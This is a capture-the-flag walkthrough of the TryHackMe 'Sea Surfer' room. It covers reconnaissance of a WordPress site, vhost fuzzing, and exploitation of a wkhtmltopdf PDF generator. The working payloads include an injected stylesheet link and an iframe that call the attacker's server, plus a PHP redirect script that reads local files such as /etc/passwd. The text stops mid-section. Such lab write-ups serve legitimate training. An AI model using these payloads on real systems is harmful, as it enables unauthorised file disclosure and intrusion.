# Sea Surfer

URL: https://tryhackme.com/room/seasurfer

Level: Hard

Date: 5 Aug 2023

- [Reconnaissance](#reconnaissance)
	- [NMAP](#nmap)
	- [Web site](#website)
	- [Dirbusting](#dirbusting)
	- [Another vhost](#another-vhost)
- [Footprinting Wordpress](#footprinting-wordpress)
	- [Version](#version)
	- [Themes](#themes)
	- [Plugins](#plugins)
	- [User](#user)
	- [XMLRPC methods](xmlrpc-methods)
	- [WPscan](#wpscan)
	- [Brute force](#brute-force)
- [Vhost fuzzing](#vhost-fuzzing)
- ["Internal" vhost](#internal-vhost)
	- [DomPDF RCE](#dompdf-rce)
	- [WKHTMLTOPDF](#wkhtmltopdf)
	- [LFI](#lfi)
	- [wp-config.php](#wp-config)
	- [Wordpress backend](#wp-backend)
	- [Backup script](#backup-script)
	- [TAR wildcard abuse](#tar-wildcard-abuse)
- [User flag](#user-flag)
- [Privesc](#privesc)
	- [LinPeas](#linpeas)
	- [Hashcat](#hashcat)
	- [Snap](#snap)

## Reconnaissance

### nmap

```bash
joshua@kaligra:~/Documents/thm/sea_surfer$ sudo nmap -T4 -n -p- 10.10.186.152 -oA nmap
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-05 14:38 CEST
Nmap scan report for 10.10.186.152
Host is up (0.053s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 43.34 seconds
```

```bash
joshua@kaligra:~/Documents/thm/sea_surfer$ sudo nmap -T4 -n -p80 -sC -sV  10.10.186.152 -oA nmap2
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-05 14:39 CEST
Nmap scan report for 10.10.186.152
Host is up (0.052s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.22 seconds
```

### website

Default Apache page:

![](Pasted%20image%2020230805144031.png)

### Dirbusting

```bash
joshua@kaligra:~/Documents/thm/sea_surfer$ feroxbuster --silent -u http://10.10.186.152 -t 200 -L 1 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -o ferox.txt
http://10.10.186.152/
http://10.10.186.152/server-status
..
..
```

Meanwhile, we look at HTTP request and we discover some interesting...

```bash
joshua@kaligra:~$ curl -I http://10.10.186.152

HTTP/1.1 200 OK
Date: Sat, 05 Aug 2023 12:44:37 GMT
Server: Apache/2.4.41 (Ubuntu)
Last-Modified: Sun, 17 Apr 2022 18:54:09 GMT
ETag: "2aa6-5dcde2b3f2ff9"
Accept-Ranges: bytes
Content-Length: 10918
Vary: Accept-Encoding
X-Backend-Server: seasurfer.thm
Content-Type: text/html
```


So, we set a static entry on our `/etc/hosts` file:

```bash
root@kaligra:~# grep seas /etc/hosts
10.10.186.152   seasurfer.thm
```

### Another vhost

![](Pasted%20image%2020230805144718.png)

By inspecting source code, it looks like Wordpress:

```html
$ curl http://seasurfer.thm | grep --color wp-content
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0<link rel='stylesheet' id='twentyseventeen-style-css'  href='http://seasurfer.thm/wp-content/themes/twentyseventeen/style.css?ver=20201208' media='all' />
<link rel='stylesheet' id='twentyseventeen-block-style-css'  href='http://seasurfer.thm/wp-content/themes/twentyseventeen/assets/css/blocks.css?ver=20190105' media='all' />
<link rel='stylesheet' id='twentyseventeen-ie8-css'  href='http://seasurfer.thm/wp-content/themes/twentyseventeen/assets/css/ie8.css?ver=20161202' media='all' />
<link rel='stylesheet' id='tmm-css'  href='http://seasurfer.thm/wp-content/plugins/team-members/inc/css/tmm_style.css?ver=5.9.3' media='all' />
<script src='http://seasurfer.thm/wp-content/themes/twentyseventeen/assets/js/html5.js?ver=20161020' id='html5-js'></script>
..
..
```

```bash
joshua@kaligra:~/Documents/thm/sea_surfer$ feroxbuster --silent -u http://seasurfer.thm -t 200 -L 1 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -o ferox2.txt
http://seasurfer.thm/news => http://seasurfer.thm/news/
http://seasurfer.thm/
http://seasurfer.thm/searchengines
http://seasurfer.thm/Elements
http://seasurfer.thm/bookshelf
http://seasurfer.thm/ISPs
http://seasurfer.thm/0706
http://seasurfer.thm/nav_company
http://seasurfer.thm/Educational
http://seasurfer.thm/nav_partners
http://seasurfer.thm/1735
http://seasurfer.thm/Portscan
http://seasurfer.thm/LAW
http://seasurfer.thm/warenkorb
http://seasurfer.thm/top_banner
http://seasurfer.thm/isapi
http://seasurfer.thm/discount
http://seasurfer.thm/ctc
http://seasurfer.thm/mp3s
http://seasurfer.thm/1336
http://seasurfer.thm/deluxe
http://seasurfer.thm/qs
http://seasurfer.thm/wardialers
http://seasurfer.thm/nav_products
http://seasurfer.thm/2674
http://seasurfer.thm/pizza
..
..
..
```

## footprinting Wordpress

### Version

```bash
$ curl -s http://seasurfer.thm | grep WordPress
<meta name="generator" content="WordPress 5.9.3" />
                <p>If you&#8217;re an OG, you might remember our website from last year &#8211; ugly, slow, and in the end got completely destroyed by some nasty hackers. I learned about WordPress and they say it&#8217;s really fast and secure, and as you can see, also beautiful 🙂 Hope you enjoy it. -Kyle</p>
                Proudly powered by WordPress    </a>
```

### Themes

```bash
$ curl -s http://seasurfer.thm | grep themes
<link rel='stylesheet' id='twentyseventeen-style-css'  href='http://seasurfer.thm/wp-content/themes/twentyseventeen/style.css?ver=20201208' media='all' />
<link rel='stylesheet' id='twentyseventeen-block-style-css'  href='http://seasurfer.thm/wp-content/themes/twentyseventeen/assets/css/blocks.css?ver=20190105' media='all' />
<link rel='stylesheet' id='twentyseventeen-ie8-css'  href='http://seasurfer.thm/wp-content/themes/twentyseventeen/assets/css/ie8.css?ver=20161202' media='all' />
<script src='http://seasurfer.thm/wp-content/themes/twentyseventeen/assets/js/html5.js?ver=20161020' id='html5-js'></script>
<script src='http://seasurfer.thm/wp-content/themes/twentyseventeen/assets/js/skip-link-focus-fix.js?ver=20161114' id='twentyseventeen-skip-link-focus-fix-js'></script>
<script src='http://seasurfer.thm/wp-content/themes/twentyseventeen/assets/js/navigation.js?ver=20161203' id='twentyseventeen-navigation-js'></script>
<script src='http://seasurfer.thm/wp-content/themes/twentyseventeen/assets/js/global.js?ver=20190121' id='twentyseventeen-global-js'></script>
<script src='http://seasurfer.thm/wp-content/themes/twentyseventeen/assets/js/jquery.scrollTo.js?ver=2.1.2' id='jquery-scrollto-js'></script>
```

### Plugins

```bash
$ curl -s http://seasurfer.thm | grep plugins
<link rel='stylesheet' id='tmm-css'  href='http://seasurfer.thm/wp-content/plugins/team-members/inc/css/tmm_style.css?ver=5.9.3' media='all' />
```

### User

```bash
$ curl -s -I -X GET http://seasurfer.thm/?author=1
HTTP/1.1 301 Moved Permanently
Date: Sat, 05 Aug 2023 17:12:07 GMT
Server: Apache/2.4.41 (Ubuntu)
X-Redirect-By: WordPress
Location: http://seasurfer.thm/author/kyle/
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

### XMLRPC methods

```bash
$ curl -X POST -d "<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>" http://seasurfer.thm/xmlrpc.php

<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params>
    <param>
      <value>
      <array><data>
  <value><string>system.multicall</string></value>
  <value><string>system.listMethods</string></value>
  <value><string>system.getCapabilities</string></value>
  <value><string>demo.addTwoNumbers</string></value>
  <value><string>demo.sayHello</string></value>
  <value><string>pingback.extensions.getPingbacks</string></value>
  <value><string>pingback.ping</string></value>
  <value><string>mt.publishPost</string></value>
  <value><string>mt.getTrackbackPings</string></value>
  <value><string>mt.supportedTextFilters</string></value>
  <value><string>mt.supportedMethods</string></value>
  <value><string>mt.setPostCategories</string></value>
  <value><string>mt.getPostCategories</string></value>
  <value><string>mt.getRecentPostTitles</string></value>
  <value><string>mt.getCategoryList</string></value>
  <value><string>metaWeblog.getUsersBlogs</string></value>
  <value><string>metaWeblog.deletePost</string></value>
  <value><string>metaWeblog.newMediaObject</string></value>
  <value><string>metaWeblog.getCategories</string></value>
  <value><string>metaWeblog.getRecentPosts</string></value>
  <value><string>metaWeblog.getPost</string></value>
  <value><string>metaWeblog.editPost</string></value>
  <value><string>metaWeblog.newPost</string></value>
  <value><string>blogger.deletePost</string></value>
  <value><string>blogger.editPost</string></value>
  <value><string>blogger.newPost</string></value>
  <value><string>blogger.getRecentPosts</string></value>
  <value><string>blogger.getPost</string></value>
  <value><string>blogger.getUserInfo</string></value>
  <value><string>blogger.getUsersBlogs</string></value>
  <value><string>wp.restoreRevision</string></value>
  <value><string>wp.getRevisions</string></value>
  <value><string>wp.getPostTypes</string></value>
  <value><string>wp.getPostType</string></value>
  <value><string>wp.getPostFormats</string></value>
  <value><string>wp.getMediaLibrary</string></value>
  <value><string>wp.getMediaItem</string></value>
  <value><string>wp.getCommentStatusList</string></value>
  <value><string>wp.newComment</string></value>
  <value><string>wp.editComment</string></value>
  <value><string>wp.deleteComment</string></value>
  <value><string>wp.getComments</string></value>
  <value><string>wp.getComment</string></value>
  <value><string>wp.setOptions</string></value>
  <value><string>wp.getOptions</string></value>
  <value><string>wp.getPageTemplates</string></value>
  <value><string>wp.getPageStatusList</string></value>
  <value><string>wp.getPostStatusList</string></value>
  <value><string>wp.getCommentCount</string></value>
  <value><string>wp.deleteFile</string></value>
  <value><string>wp.uploadFile</string></value>
  <value><string>wp.suggestCategories</string></value>
  <value><string>wp.deleteCategory</string></value>
  <value><string>wp.newCategory</string></value>
  <value><string>wp.getTags</string></value>
  <value><string>wp.getCategories</string></value>
  <value><string>wp.getAuthors</string></value>
  <value><string>wp.getPageList</string></value>
  <value><string>wp.editPage</string></value>
  <value><string>wp.deletePage</string></value>
  <value><string>wp.newPage</string></value>
  <value><string>wp.getPages</string></value>
  <value><string>wp.getPage</string></value>
  <value><string>wp.editProfile</string></value>
  <value><string>wp.getProfile</string></value>
  <value><string>wp.getUsers</string></value>
  <value><string>wp.getUser</string></value>
  <value><string>wp.getTaxonomies</string></value>
  <value><string>wp.getTaxonomy</string></value>
  <value><string>wp.getTerms</string></value>
  <value><string>wp.getTerm</string></value>
  <value><string>wp.deleteTerm</string></value>
  <value><string>wp.editTerm</string></value>
  <value><string>wp.newTerm</string></value>
  <value><string>wp.getPosts</string></value>
  <value><string>wp.getPost</string></value>
  <value><string>wp.deletePost</string></value>
  <value><string>wp.editPost</string></value>
  <value><string>wp.newPost</string></value>
  <value><string>wp.getUsersBlogs</string></value>
</data></array>
      </value>
    </param>
  </params>
</methodResponse>

```

### WPscan

```bash
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://seasurfer.thm/ [10.10.18.214]
[+] Started: Sat Aug  5 19:14:54 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://seasurfer.thm/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://seasurfer.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://seasurfer.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://seasurfer.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.9.3 identified (Insecure, released on 2022-04-05).
 | Found By: Rss Generator (Passive Detection)
 |  - http://seasurfer.thm/feed/, <generator>https://wordpress.org/?v=5.9.3</generator>
 |  - http://seasurfer.thm/comments/feed/, <generator>https://wordpress.org/?v=5.9.3</generator>
 |
 | [!] 21 vulnerabilities identified:
 |
 | [!] Title: WP < 6.0.2 - Reflected Cross-Site Scripting
 |     Fixed in: 5.9.4
 |     References:
 |      - https://wpscan.com/vulnerability/622893b0-c2c4-4ee7-9fa1-4cecef6e36be
 |      - https://wordpress.org/news/2022/08/wordpress-6-0-2-security-and-maintenance-release/
 |
 | [!] Title: WP < 6.0.2 - Authenticated Stored Cross-Site Scripting
 |     Fixed in: 5.9.4
 |     References:
 |      - https://wpscan.com/vulnerability/3b1573d4-06b4-442b-bad5-872753118ee0
 |      - https://wordpress.org/news/2022/08/wordpress-6-0-2-security-and-maintenance-release/
 |
 | [!] Title: WP < 6.0.2 - SQLi via Link API
 |     Fixed in: 5.9.4
 |     References:
 |      - https://wpscan.com/vulnerability/601b0bf9-fed2-4675-aec7-fed3156a022f
 |      - https://wordpress.org/news/2022/08/wordpress-6-0-2-security-and-maintenance-release/
 |
 | [!] Title: WP < 6.0.3 - Stored XSS via wp-mail.php
 |     Fixed in: 5.9.5
 |     References:
 |      - https://wpscan.com/vulnerability/713bdc8b-ab7c-46d7-9847-305344a579c4
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/abf236fdaf94455e7bc6e30980cf70401003e283
 |
 | [!] Title: WP < 6.0.3 - Open Redirect via wp_nonce_ays
 |     Fixed in: 5.9.5
 |     References:
 |      - https://wpscan.com/vulnerability/926cd097-b36f-4d26-9c51-0dfab11c301b
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/506eee125953deb658307bb3005417cb83f32095
 |
 | [!] Title: WP < 6.0.3 - Email Address Disclosure via wp-mail.php
 |     Fixed in: 5.9.5
 |     References:
 |      - https://wpscan.com/vulnerability/c5675b59-4b1d-4f64-9876-068e05145431
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/5fcdee1b4d72f1150b7b762ef5fb39ab288c8d44
 |
 | [!] Title: WP < 6.0.3 - Reflected XSS via SQLi in Media Library
 |     Fixed in: 5.9.5
 |     References:
 |      - https://wpscan.com/vulnerability/cfd8b50d-16aa-4319-9c2d-b227365c2156
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/8836d4682264e8030067e07f2f953a0f66cb76cc
 |
 | [!] Title: WP < 6.0.3 - CSRF in wp-trackback.php
 |     Fixed in: 5.9.5
 |     References:
 |      - https://wpscan.com/vulnerability/b60a6557-ae78-465c-95bc-a78cf74a6dd0
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/a4f9ca17fae0b7d97ff807a3c234cf219810fae0
 |
 | [!] Title: WP < 6.0.3 - Stored XSS via the Customizer
 |     Fixed in: 5.9.5
 |     References:
 |      - https://wpscan.com/vulnerability/2787684c-aaef-4171-95b4-ee5048c74218
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/2ca28e49fc489a9bb3c9c9c0d8907a033fe056ef
 |
 | [!] Title: WP < 6.0.3 - Stored XSS via Comment Editing
 |     Fixed in: 5.9.5
 |     References:
 |      - https://wpscan.com/vulnerability/02d76d8e-9558-41a5-bdb6-3957dc31563b
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/89c8f7919460c31c0f259453b4ffb63fde9fa955
 |
 | [!] Title: WP < 6.0.3 - Content from Multipart Emails Leaked
 |     Fixed in: 5.9.5
 |     References:
 |      - https://wpscan.com/vulnerability/3f707e05-25f0-4566-88ed-d8d0aff3a872
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/3765886b4903b319764490d4ad5905bc5c310ef8
 |
 | [!] Title: WP < 6.0.3 - SQLi in WP_Date_Query
 |     Fixed in: 5.9.5
 |     References:
 |      - https://wpscan.com/vulnerability/1da03338-557f-4cb6-9a65-3379df4cce47
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/d815d2e8b2a7c2be6694b49276ba3eee5166c21f
 |
 | [!] Title: WP < 6.0.3 - Stored XSS via RSS Widget
 |     Fixed in: 5.9.5
 |     References:
 |      - https://wpscan.com/vulnerability/58d131f5-f376-4679-b604-2b888de71c5b
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/929cf3cb9580636f1ae3fe944b8faf8cca420492
 |
 | [!] Title: WP < 6.0.3 - Data Exposure via REST Terms/Tags Endpoint
 |     Fixed in: 5.9.5
 |     References:
 |      - https://wpscan.com/vulnerability/b27a8711-a0c0-4996-bd6a-01734702913e
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/ebaac57a9ac0174485c65de3d32ea56de2330d8e
 |
 | [!] Title: WP < 6.0.3 - Multiple Stored XSS via Gutenberg
 |     Fixed in: 5.9.5
 |     References:
 |      - https://wpscan.com/vulnerability/f513c8f6-2e1c-45ae-8a58-36b6518e2aa9
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/gutenberg/pull/45045/files
 |
 | [!] Title: WP <= 6.2 - Unauthenticated Blind SSRF via DNS Rebinding
 |     References:
 |      - https://wpscan.com/vulnerability/c8814e6e-78b3-4f63-a1d3-6906a84c1f11
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3590
 |      - https://blog.sonarsource.com/wordpress-core-unauthenticated-blind-ssrf/
 |
 | [!] Title: WP < 6.2.1 - Directory Traversal via Translation Files
 |     Fixed in: 5.9.6
 |     References:
 |      - https://wpscan.com/vulnerability/2999613a-b8c8-4ec0-9164-5dfe63adf6e6
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-2745
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |
 | [!] Title: WP < 6.2.1 - Thumbnail Image Update via CSRF
 |     Fixed in: 5.9.6
 |     References:
 |      - https://wpscan.com/vulnerability/a03d744a-9839-4167-a356-3e7da0f1d532
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |
 | [!] Title: WP < 6.2.1 - Contributor+ Stored XSS via Open Embed Auto Discovery
 |     Fixed in: 5.9.6
 |     References:
 |      - https://wpscan.com/vulnerability/3b574451-2852-4789-bc19-d5cc39948db5
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |
 | [!] Title: WP < 6.2.2 - Shortcode Execution in User Generated Data
 |     Fixed in: 5.9.7
 |     References:
 |      - https://wpscan.com/vulnerability/ef289d46-ea83-4fa5-b003-0352c690fd89
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-2-security-release/
 |
 | [!] Title: WP < 6.2.1 - Contributor+ Content Injection
 |     Fixed in: 5.9.6
 |     References:
 |      - https://wpscan.com/vulnerability/1527ebdb-18bc-4f9d-9c20-8d729a628670
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/

[+] WordPress theme in use: twentyseventeen
 | Location: http://seasurfer.thm/wp-content/themes/twentyseventeen/
 | Last Updated: 2023-03-29T00:00:00.000Z
 | Readme: http://seasurfer.thm/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 3.2
 | Style URL: http://seasurfer.thm/wp-content/themes/twentyseventeen/style.css?ver=20201208
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 2.9 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://seasurfer.thm/wp-content/themes/twentyseventeen/style.css?ver=20201208, Match: 'Version: 2.9'


[i] Plugin(s) Identified:

[+] team-members
 | Location: http://seasurfer.thm/wp-content/plugins/team-members/
 | Last Updated: 2023-02-06T14:41:00.000Z
 | [!] The version is out of date, the latest version is 5.3.0
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | [!] 2 vulnerabilities identified:
 |
 | [!] Title: Team Members < 5.1.1 - Admin+ Stored Cross-Site Scripting
 |     Fixed in: 5.1.1
 |     References:
 |      - https://wpscan.com/vulnerability/88328d17-ffc9-4b94-8b01-ad2fd3047fbc
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1568
 |
 | [!] Title: Team Members < 5.2.1 - Editor+ Stored XSS
 |     Fixed in: 5.2.1
 |     References:
 |      - https://wpscan.com/vulnerability/921daea1-a06d-4310-8bd9-4db32605e500
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3936
 |
 | Version: 5.1.0 (50% confidence)
 | Found By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://seasurfer.thm/wp-content/plugins/team-members/readme.txt


[i] No Config Backups Found.

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 3
 | Requests Remaining: 22

[+] Finished: Sat Aug  5 19:15:19 2023
[+] Requests Done: 177
[+] Cached Requests: 7
[+] Data Sent: 44.304 KB
[+] Data Received: 562.963 KB
[+] Memory used: 234.441 MB
[+] Elapsed time: 00:00:24

```

### Brute force

```bash
[+] Performing password attack on Xmlrpc against 1 user/s
Error: Unknown response received Code: 405
Error: Unknown response received Code: 405
Error: Unknown response received Code: 405
Error: Unknown response received Code: 405
Error: Unknown response received Code: 405
Error: Unknown response received Code: 405
Error: Unknown response received Code: 405
Error: Unknown response received Code: 405
Error: Unknown response received Code: 405
Error: Unknown response received Code: 405
Error: Unknown response received Code: 405
Error: Unknown response received Code: 405
Error: Unknown response received Code: 405
Error: Unknown response received Code: 405
Error: Unknown response received Code: 405
Error: Unknown response received Code: 405
Error: Unknown response received Code: 405
Error: Unknown response received Code: 405
Error: Unknown response received Code: 405
Error: Unknown response received Code: 405
```

...maybe we should start from this post and found the OLD site?

![](Pasted%20image%2020230805193605.png)

## vhost fuzzing

We found another vhost (`internal`):

```bash
$ ffuf -w /opt/SecLists/Discovery/DNS/shubs-subdomains.txt -u http://seasurfer.thm -H "Host: FUZZ.seasurfer.thm" -fs 10918

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://seasurfer.thm
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/shubs-subdomains.txt
 :: Header           : Host: FUZZ.seasurfer.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 10918
________________________________________________

internal                [Status: 200, Size: 3072, Words: 225, Lines: 109, Duration: 108ms]
..
..
```

## Internal vhost

![](Pasted%20image%2020230805194319.png)

We try to create a receipt:

![](Pasted%20image%2020230805194405.png)


The result is a PDF file:

![](Pasted%20image%2020230805194424.png)

So, probably our goal is to inject code during PDF generation, to achieve RCE.

![](Pasted%20image%2020230805194543.png)

Meanwhile, we try dirbusting on this new vhost:

```
joshua@kaligra:~/Documents/thm/sea_surfer$ feroxbuster --silent -u http://internal.seasurfer.thm -t 50 -L 1 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -o ferox3.txt
http://internal.seasurfer.thm/
http://internal.seasurfer.thm/maintenance => http://internal.seasurfer.thm/maintenance/
http://internal.seasurfer.thm/server-status
```

With another wordlist (which includes `/dompdf`):

```bash
joshua@kaligra:~/Documents/thm/sea_surfer$ feroxbuster --silent -u http://internal.seasurfer.thm/ -t 20 -w /opt/SecLists/Discovery/Web-Content/big.txt -o ferox4.txt
http://internal.seasurfer.thm/
http://internal.seasurfer.thm/.htpasswd
http://internal.seasurfer.thm/.htaccess
http://internal.seasurfer.thm/invoices => http://internal.seasurfer.thm/invoices/
http://internal.seasurfer.thm/invoices/.htpasswd
http://internal.seasurfer.thm/invoices/.htaccess
http://internal.seasurfer.thm/maintenance => http://internal.seasurfer.thm/maintenance/
http://internal.seasurfer.thm/maintenance/.htaccess
http://internal.seasurfer.thm/maintenance/.htpasswd
http://internal.seasurfer.thm/server-status
```

We get `Forbidden` on `/maintenance` page.
### DomPDF rce

Let's try this technique:

https://exploit-notes.hdks.org/exploit/web/dompdf-rce/

https://www.optiv.com/insights/source-zero/blog/exploiting-rce-vulnerability-dompdf

https://github.com/positive-security/dompdf-rce

https://positive.security/blog/dompdf-rce

We spawn an HTTP web server on our attacker machine:

```bash
joshua@kaligra:~/Documents/thm/sea_surfer$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

We create a receipt and we add this content to "comment":

```
<link rel=stylesheet href='http://10.8.100.14:8080/exploit.css'>
```

We receive a connection!!!

```bash
joshua@kaligra:~/Documents/thm/sea_surfer$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.10.230.66 - - [05/Aug/2023 19:49:07] code 404, message File not found
10.10.230.66 - - [05/Aug/2023 19:49:07] "GET /exploit.css HTTP/1.1" 404 -
```

Let's use actual exploit:

```bash
$ git clone https://github.com/positive-security/dompdf-rce.git
Cloning into 'dompdf-rce'...
remote: Enumerating objects: 343, done.
remote: Counting objects: 100% (343/343), done.
remote: Compressing objects: 100% (271/271), done.
remote: Total 343 (delta 67), reused 329 (delta 62), pack-reused 0
Receiving objects: 100% (343/343), 3.99 MiB | 5.26 MiB/s, done.
Resolving deltas: 100% (67/67), done.
```

Change CSS with our IP/port:

```bash
$ cat exploit.css
@font-face {
    font-family:'exploitfont';
    src:url('http://localhost:9001/exploit_font.php');
    font-weight:'normal';
    font-style:'normal';
  }

```

Spawn PHP web server


```bash
joshua@kaligra:~/Documents/thm/sea_surfer/dompdf-rce/exploit$ php -S 0.0.0.0:9001
[Sat Aug  5 20:06:05 2023] PHP 8.2.1 Development Server (http://0.0.0.0:9001) started
```

...after a few tries, this technique seems not working.



Let's change a bit.

Let's download one of generated PDF and inspect it with `exiftool`:

```bash
joshua@kaligra:~/Documents/thm/sea_surfer$ exiftool 06082023-MmGxLWiJ01TcWsBQpLG5.pdf
ExifTool Version Number         : 12.55
File Name                       : 06082023-MmGxLWiJ01TcWsBQpLG5.pdf
Directory                       : .
File Size                       : 53 kB
File Modification Date/Time     : 2023:08:06 15:18:54+02:00
File Access Date/Time           : 2023:08:06 15:18:54+02:00
File Inode Change Date/Time     : 2023:08:06 15:18:54+02:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Title                           : Receipt
Creator                         : wkhtmltopdf 0.12.5
Producer                        : Qt 4.8.7
Create Date                     : 2023:08:06 13:17:11Z
Page Count                      : 1
```

It seems `wkhtmltopdf` is used here, NOT DomPDF!

### wkhtmltopdf

Let's try this:

https://hassankhanyusufzai.com/SSRF-to-LFI/

![](Pasted%20image%2020230806152650.png)

It works!

![](Pasted%20image%2020230806152708.png)

We create a file `exploit.php` with this content:

```php
<?php header('location:file://'.$_REQUEST['url']); ?>
```

and we spawn local PHP webserver:

```bash
joshua@kaligra:~/Documents/thm/sea_surfer$ php -S 0.0.0.0:9001
[Sun Aug  6 15:32:24 2023] PHP 8.2.1 Development Server (http://0.0.0.0:9001) started
```

### LFI

Let's try with this payload

```bash
"><iframe height="2000" width="800" src=http://10.8.100.14:9001/exploit.php?url=%2fetc%2fpasswd></iframe>
```

**ATTENTION**: you should use the `url` parameter, not "x" as in this example:

![](Pasted%20image%2020230806153917.png)

![](Pasted%20image%2020230806154147.png)

So far, we have LFI and we discovered the local user `kyle`.

GET request:


```bash
